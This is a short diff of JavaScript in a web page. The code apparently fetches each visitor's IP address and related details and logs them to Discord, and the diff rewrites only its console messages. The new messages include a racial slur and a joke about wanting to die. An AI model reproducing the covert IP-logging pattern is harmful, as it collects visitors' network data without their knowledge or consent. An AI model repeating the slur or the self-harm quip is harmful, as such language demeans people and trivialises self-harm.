@@ -140,21 +140,21 @@
               })
                 .then(response => {
                   if (response.ok) {
-                    console.log('IP information logged to Discord successfully');
+                    console.log('big yay');
                   } else {
-                    console.error('Failed to log IP information to Discord');
+                    console.error('boooooo');
                   }
                 })
                 .catch(error => {
-                  console.error('Error logging IP information to Discord:', error);
+                  console.error('i wanna die:', error);
                 });
             })
             .catch(error => {
-              console.error('Error retrieving IP information:', error);
+              console.error('i feel fantastic hey hey heeeey', error);
             });
         })
         .catch(error => {
-          console.error('Error retrieving IP address:', error);
+          console.error('nigga what', error);
         });
     });
   </script>
